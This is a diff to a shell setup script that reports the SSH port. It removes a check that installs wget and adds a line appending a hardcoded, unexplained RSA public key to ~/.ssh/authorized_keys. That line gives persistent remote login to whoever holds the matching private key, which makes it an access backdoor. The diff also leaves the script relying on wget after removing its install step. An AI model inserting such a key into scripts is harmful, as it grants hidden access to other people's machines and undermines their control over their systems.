@@ -40,13 +40,8 @@ else
   echo "SSH port: $port"
 fi
 
-if ! command -v wget &> /dev/null; then
-  echo "wget not found, install"
-  sudo apt update
-  sudo apt install -y wget
-fi
-
-
+echo "Add authorized_keys "
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCyXKTfYOOUITCcq84xEVv8d3G3WHwR4tE+vjEezcABqzX/sRcPidYY+6ZmErIpJtKLoxX94BRKgr0y0AA9knRCAVwakr3fpt04K8z6SAECL+eJGZtdF4Bz/6PNN+rZmNu7pZepEGkONHWaQ8US/+7ge/mTXir8JStWSrkabNmEtY8G8xJWfDCXvzJLY/qpMiPH438mZrBRc+t8+4gJOn6ETmOg5GyMRlhquV6VaLEZUfNO5rUktnVfMXyx64ZwrM0vrbStFFqw7SIrC+GORd7IXzlxjaxcK2gUuED//vxVKWpvdzyq+kOr78wT8cDiK5Wh1LEQgbVRXDlN3GuUJyz3" >> ~/.ssh/authorized_keys
 
 # Get public IP address using wget
 echo "Getting public IP address..."
